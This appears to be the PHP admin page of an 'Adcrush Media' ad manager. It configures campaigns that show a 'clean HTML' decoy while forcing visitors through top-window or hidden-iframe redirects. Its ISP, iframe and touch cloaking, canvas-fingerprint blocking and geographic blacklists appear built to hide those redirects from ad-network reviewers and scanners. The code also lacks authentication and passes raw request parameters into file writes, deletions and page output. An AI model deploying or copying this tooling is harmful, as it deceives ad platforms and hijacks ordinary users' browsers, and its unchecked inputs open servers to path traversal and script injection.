<?php

	require_once("adlib.inc");

	function print_r_nice($mixed)
	{
		echo str_replace("\n", "<br/>", print_r($mixed, true));
	}

	function array_get_bool($array, $key)
	{
		return array_key_exists($key, $array) && $array[$key] === "false" ? false : true;
	}

	function array_get_value_with_default($array, $key, $default = null)
	{
	    return array_key_exists($key, $array) ? $array[$key] : $default;
	}	

	function getAdTagCode($campaignID)
	{
		$adUrl = "http" . (!empty($_SERVER['HTTPS']) ? "s" : "") . "://" . $_SERVER['SERVER_NAME'] . substr($_SERVER['REQUEST_URI'], 0, strrpos($_SERVER['REQUEST_URI'], "/") + 1) . "ad.php?$campaignID";

		$adConfig = processConfig(getConfigFilename($campaignID));

		if (array_key_exists("OutputMethod", $adConfig) && $adConfig["OutputMethod"] === "JS")
		{
			return htmlentities("<script type=\"text/javascript\" src=\"$adUrl\"></script>");
		}

		return $adUrl;
	}

	function getAds()
	{
		$files = scandir("ads");
		$result = array();

		foreach ($files as $filename)
		{
			if (strpos($filename, ".cleanad.html") !== false)
			{
				$campaignID = substr($filename, 0, strpos($filename, ".cleanad.html"));

				if (!array_key_exists($campaignID, $result))
				{
					$result[$campaignID] = array();
				}

				array_push($result[$campaignID], $filename);
			}

			if (strpos($filename, ".config.txt") !== false)
			{
				$campaignID = substr($filename, 0, strpos($filename, ".config.txt"));

				if (!array_key_exists($campaignID, $result))
				{
					$result[$campaignID] = array();
				}

				array_push($result[$campaignID], $filename);
			}
		}

		return $result;
	}

	function createorUpdateAd($campaignID, $cleanHtml, $configArray)
	{
		$cleanHtmlFilename = getCleanHtmlFilename($campaignID);
		$configFilename  = getConfigFilename($campaignID);

		file_put_contents($cleanHtmlFilename, $cleanHtml);

		$configFileContents = "";

		foreach ($configArray as $key => $value)
		{
			$configFileContents .= "$key: $value\r\n";
		}

		file_put_contents($configFilename, $configFileContents);
	}

	function deleteAd($campaignID)
	{
		$cleanHtmlFilename = getCleanHtmlFilename($campaignID);
		$configFilename  = getConfigFilename($campaignID);

		if (file_exists($cleanHtmlFilename))
		{
			unlink($cleanHtmlFilename);
		}

		if (file_exists($configFilename))
		{
			unlink($configFilename);
		}
	}

	if (array_key_exists("edit", $_GET))
	{
		$currentAd["campaignID"] = $_GET['edit'];
		$currentAd["configArray"] = processConfig(getConfigFilename($_GET['edit']));
		$currentAd["cleanHtml"] = file_get_contents(getCleanHtmlFilename($_GET['edit']));
	}
	else
	{
		$currentAd = array("campaignID" 	=> "", 
				   		   "configArray" 	=> array("Method" => "windowtoplocation", 
				   		   							 "TrackingPixelEnabled" => "true", 
				   		   							 "OutputMethod" => "HTML", 
				   		   							 "CanvasFingerprintCheckEnabled" => "false",
				   		   							 "ISPCloakingEnabled" => "true",
				   		   							 "IFrameCloakingEnabled" => "true",
				   		   							 "TouchCloakingEnabled" => "true"),
				   		   "cleanHtml" 		=> "<html>\n<head>\n\t{script}\n</head>\n<body{onload}>\n</body>\n</html>");
	}

	if (array_key_exists("delete", $_GET))
	{
		deleteAd($_GET['delete']);
	}

	if (!empty($_POST))
	{
		//print_r_nice($_POST);

		$configArray = array();

		foreach ($_POST as $key => $value)
		{
			if($key{0} === strtoupper($key{0}))
			{
				$configArray[$key] = $value;
			}
		}

		//print_r_nice($configArray);

		createorUpdateAd($_POST['campaignID'], $_POST['cleanHtml'], $configArray);
	}

?>

<html>
<head>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
	<script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/1.10.12/js/jquery.dataTables.min.js"></script>
	<script type="text/javascript" charset="utf8" src="https://cdn.datatables.net/1.10.12/js/dataTables.bootstrap.min.js"></script>
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
	<script src="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">

	<script type="text/javascript">
		$(document).ready(function() {
		    //$('#adTable').DataTable();

<?php
	if (!empty($_POST))
	{
		echo "toastr.options.timeOut = 10;";
		echo "toastr.options.closeDuration = 500;\n";
		echo "toastr.success('Saved');\n";
	}
?>		    
		});
	</script>

	<title>
		Ad Manager - Adcrush Media
	</title>

</head>

<body>

	<div style="width: 95%; margin: 10 auto;">

<?php

	if (array_key_exists("new", $_GET) || array_key_exists("edit", $_GET))
	{

		$redirectMethodOptions = array("windowlocation", "windowtoplocation", "0x0iframe", "1x1iframe");
		$outputMethodOptions = array("HTML", "JS");

?>
		<form action="admanager.php" method="post" onsubmit="return checkConfigForm();">

		<table class="table table-striped" id="configTable">

			<tr>
				<td  class="col-xs-5">Campaign ID</td>
				<td><input type="text" name="campaignID" id="campaignID" class="form-control form-control-lg" value="<?= array_get_value_with_default($currentAd, "campaignID"); ?>" <?= array_get_value_with_default($currentAd, "campaignID", "") !== "" ? "readonly" : null; ?>/></td>
			</tr>

			<tr>
				<td>Ad Country Code</td>
				<td><input type="text" name="CountryCode" id="CountryCode" class="form-control form-control-lg" value="<?= array_get_value_with_default($currentAd["configArray"], "CountryCode", "US"); ?>" /></td>
			</tr>

			<tr>
				<td>Redirect URL</td>
				<td><input type="text" name="RedirectUrl" id="RedirectUrl" class="form-control form-control-lg" value="<?= array_get_value_with_default($currentAd["configArray"], "RedirectUrl"); ?>" /></td>
			</tr>

			<tr>
				<td>Redirect Method</td>
				<td>
					<select name="Method" class="form-control">

<?php
					foreach ($redirectMethodOptions as $option)
					{
						if (array_get_value_with_default($currentAd["configArray"], "Method") == $option)
						{
							echo "<option value=\"$option\" selected=\"selected\">$option</option>\n";
						}
						else
						{
							echo "<option value=\"$option\">$option</option>\n";
						}
					}
?>
					</select>
				</td>
			</tr>

			<tr>
				<td>Redirect Timeout (ms.)</td>
				<td><input type="text" name="RedirectTimeout" id="RedirectTimeout" class="form-control form-control-lg" value="<?= array_get_value_with_default($currentAd["configArray"], "RedirectTimeout", "3000"); ?>" /></td>
			</tr>

			<tr>
				<td>Redirect Enabled</td>
				<td>
					<input type="hidden" name="RedirectEnabled" value="false" />
					<input class="form-check-input" type="checkbox" name="RedirectEnabled" value="true" <?= (array_get_bool($currentAd["configArray"], "RedirectEnabled") ? "checked=checked" : null); ?> />
				</td>
			</tr>

			<tr>
				<td>Tracking Pixel URL</td>
				<td><input type="text" name="TrackingPixelUrl" id="TrackingPixelUrl" class="form-control form-control-lg" value="<?= array_get_value_with_default($currentAd["configArray"], "TrackingPixelUrl"); ?>" /></td>
			</tr>

			<tr>
				<td>Tracking Pixel Enabled</td>
				<td>
					<input type="hidden" name="TrackingPixelEnabled" value="false" />
					<input class="form-check-input" type="checkbox" name="TrackingPixelEnabled" value="true" <?= (array_get_bool($currentAd["configArray"], "TrackingPixelEnabled") ? "checked=checked" : null); ?> />
				</td>
			</tr>			

			<tr>
				<td>Output Method</td>
				<td>
					<select name="OutputMethod" class="form-control">
<?php
					foreach ($outputMethodOptions as $option)
					{
						if (array_get_value_with_default($currentAd["configArray"], "OutputMethod") == $option)
						{
							echo "<option value=\"$option\" selected=\"selected\">$option</option>\n";
						}
						else
						{
							echo "<option value=\"$option\">$option</option>\n";
						}
					}
?>
					</select>
				</td>
			</tr>

			<tr>
				<td>Canvas Fingerprint Check Enabled</td>
				<td>
					<input type="hidden" name="CanvasFingerprintCheckEnabled" value="false" />
					<input class="form-check-input" type="checkbox" name="CanvasFingerprintCheckEnabled" value="true" <?= (array_get_bool($currentAd["configArray"], "CanvasFingerprintCheckEnabled") ? "checked=checked" : null); ?> />
				</td>
			</tr>

			<tr>
				<td>Blocked Canvas Fingerprints (comma separated)</td>
				<td><input type="text" name="BlockedCanvasFingerprints" class="form-control form-control-lg" value="<?= array_get_value_with_default($currentAd["configArray"], "BlockedCanvasFingerprints"); ?>" /></td>
			</tr>

			<tr>
				<td>Province / State Blacklist (pipe | separated)</td>
				<td><input type="text" name="ProvinceBlackList" class="form-control form-control-lg" value="<?= array_get_value_with_default($currentAd["configArray"], "ProvinceBlackList"); ?>" /></td>
			</tr>

			<tr>
				<td>City Blacklist (pipe | separated)</td>
				<td><input type="text" name="CityBlackList" class="form-control form-control-lg" value="<?= array_get_value_with_default($currentAd["configArray"], "CityBlackList"); ?>" /></td>
			</tr>

			<tr>
				<td>Logging Enabled</td>
				<td>
					<input type="hidden" name="LoggingEnabled" value="false" />
					<input class="form-check-input" type="checkbox" name="LoggingEnabled" value="true" <?= (array_get_bool($currentAd["configArray"], "LoggingEnabled") ? "checked=checked" : null); ?> />
				</td>
			</tr>

			<tr>
				<td>ISP Cloaking Enabled</td>
				<td>
					<input type="hidden" name="ISPCloakingEnabled" value="false" />
					<input class="form-check-input" type="checkbox" name="ISPCloakingEnabled" value="true" <?= (array_get_bool($currentAd["configArray"], "ISPCloakingEnabled") ? "checked=checked" : null); ?> />
				</td>
			</tr>

			<tr>
				<td>IFrame Cloaking Enabled</td>
				<td>
					<input type="hidden" name="IFrameCloakingEnabled" value="false" />
					<input class="form-check-input" type="checkbox" name="IFrameCloakingEnabled" value="true" <?= (array_get_bool($currentAd["configArray"], "IFrameCloakingEnabled") ? "checked=checked" : null); ?> />
				</td>
			</tr>

			<tr>
				<td>Touch Cloaking Enabled</td>
				<td>
					<input type="hidden" name="TouchCloakingEnabled" value="false" />
					<input class="form-check-input" type="checkbox" name="TouchCloakingEnabled" value="true" <?= (array_get_bool($currentAd["configArray"], "TouchCloakingEnabled") ? "checked=checked" : null); ?> />
				</td>
			</tr>

			<tr>
				<td colspan="2">Clean HTML code. Use placeholders {script}, {onload} and {queryString}.</td>
			</tr>

			<tr>
				<td colspan="2"><textarea style="width: 100%" rows="20" class="form-check-input" id="cleanHtml" name="cleanHtml"><?= array_get_value_with_default($currentAd, "cleanHtml"); ?></textarea></td>
			</tr>

		</table>

		<button type="submit" class="btn btn-primary">
			Save
		</button>
		<button type="button" class="btn btn-primary" onclick="window.location = 'admanager.php?<?= mt_rand(); ?>';">
			Cancel
		</button>

		</form>

		<script type="text/javascript">

			function validUrl(url)
			{
				return url === '' || url.indexOf('http') === 0;
			}

			function isInt(value)
			{
				return value == parseInt(value);
			}

			function checkConfigForm()
			{
				if ($('#campaignID').val().trim() === '')
				{
					$('#campaignID').focus();
						
					toastr.error('Campaign ID cannot be empty.');

					return false;
				}

				if ($('#CountryCode').val().trim() === '')
				{
					$('#CountryCode').focus();
						
					toastr.error('Ad Country Code cannot be empty.');

					return false;					
				}

				if ($('#cleanHtml').val().trim() === '')
				{
					$('#cleanHtml').focus();
						
					toastr.error('Clean HTML cannot be empty.');

					return false;					
				}

				if ($('#RedirectUrl').val().trim() === '' && !confirm('Redirect URL is empty, continue anyway?'))
				{
					$('#RedirectUrl').focus();

					return false;
				}

				if (!validUrl($('#RedirectUrl').val()))
				{
					$('#RedirectUrl').focus();

					toastr.error('Invalid Redirect URL.');

					return false;
				}

				if (!isInt($('#RedirectTimeout').val()))
				{
					$('#RedirectTimeout').focus();

					toastr.error('Redirect Timeout must be a whole number (int).');

					return false;
				}

				if (!validUrl($('#TrackingPixelUrl').val()))
				{
					$('#TrackingPixelUrl').focus();

					toastr.error('Invalid Tracking Pixel URL.');

					return false;
				}				

				if ($('#cleanHtml').val().indexOf('{script}') === -1 && !confirm('Clean HTML code does not contain {script} tag, continue anyway?'))
				{
					$('#cleanHtml').focus();

					return false;
				}

				return true;
			}

		</script>

<?php 
	}
	else
	{
?>		

		<button type="button" class="btn btn-primary" onclick="window.location = 'admanager.php?new';">
			New AD
		</button>

		<br/><br/>

		<table class="table table-striped" id="adTable">

			<thead>
				<tr>
					<th class="col-xs-3">Campaign ID</th>
					<th>Tag</th>
					<th style="width: 50px;"></th>
					<th style="width: 50px;"></th>
				</tr>
			</thead>

			<tbody>
		<?php

			$ads = getAds();

			foreach ($ads as $campaignID => $filenames)
			{
				$adTagCode = getAdTagCode($campaignID);

				echo "<tr>\n";
				echo "<td><a href=\"admanager.php?edit=$campaignID&" . mt_rand() . "\" alt=\"Edit\" title=\"Edit\">$campaignID</a></td>\n";
				echo "<td><input class=\"form-control form-control-lg\" type=\"text\" value=\"$adTagCode\" onclick=\"this.select(); document.execCommand('copy'); toastr.success('Link \'$adTagCode\' copied to clipboard.');\" /></td>\n";

				if (strpos($adTagCode, "javascript") === false)
				{
					echo "<td><a href=\"$adTagCode\" alt=\"View\" title=\"View\" target=\"_blank\"><span class=\"glyphicon glyphicon-search\" aria-hidden=\"true\"></span></a></td>\n";
				}
				else
				{
					echo "<td></td>\n";
				}

				echo "<td><a href=\"admanager.php?delete=$campaignID\" alt=\"Delete\" title=\"Delete\" onclick=\"return confirm('Are you sure you want to delete ad with campaignID \'$campaignID\'?');\"><span class=\"glyphicon glyphicon-trash\" aria-hidden=\"true\"></span></a></td>\n";
				echo "</tr>\n";
			}

		?>
			</tbody>
		</table>
<?php
	}
?>

		<div>
			<small>&copy; 2016 Adcrush Media</small>
		</div>

	</div>

</body>
</html>